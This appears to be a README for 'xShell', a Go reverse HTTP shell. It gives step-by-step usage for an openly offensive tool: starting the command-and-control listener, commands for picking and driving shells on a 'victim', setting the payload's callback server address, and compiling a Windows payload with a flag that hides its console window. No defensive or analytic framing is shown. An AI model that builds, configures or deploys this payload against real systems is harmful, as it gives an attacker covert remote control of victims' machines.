<div align="center">
  <h1>xShell</h1>
  <br/>
  <p><i>A simple reverse http shell written in golang</i></p>
  <br/>
</div>

# Usage

### Change listener port
In c2/httpC2.go:
```go
const Port = "80" // change port here
```

### Start listener
```sh
go run c2/httpC2.go
```
If you want to listener on port 80 or 443 you must use sudo:
```sh
sudo go run c2/httpC2.go
```

### Listener commands
```
shells - list all active shells
shell <shell_name> - interact with specifc shell
quit - quit shell (closes shell on victim)
exit - return to main menu (shell continues to run)
```

### Set call back host
In payload/xShell.go:
```go
const ServerAddr = "127.0.0.1:80" // change this to your servers IP/Host
```

### Build shell
```sh
GOOS=windows GOARCH=amd64 go build -ldflags -H=windowsgui -o xShell.exe payload/xShell.go
```